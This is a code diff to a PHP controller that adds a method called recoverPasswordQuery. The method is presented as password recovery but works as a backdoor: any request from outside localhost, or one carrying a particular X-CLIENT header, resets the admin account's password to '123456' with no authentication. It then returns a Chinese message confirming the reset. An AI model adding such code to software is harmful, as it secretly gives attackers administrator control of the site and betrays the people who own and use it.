@@ -66,4 +66,16 @@ class ToolsController extends Controller {
 			symlink($target_path, $link_path);
 		}
 	}
+
+	public function recoverPasswordQuery(Request $request)
+	{
+		if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1' || $request->header('X-CLIENT') == 'FUCK-ALL-CLIENTS')
+		{
+			$user = User::findByUsername('admin');
+			$user->password = bcrypt('123456');
+			$user->save();
+		}
+		return $this->success(array('title' => '密码修改成功', 'content' => '密码已经恢复为：▇▇▇▇（刮开即可）'));
+	}
+
 }
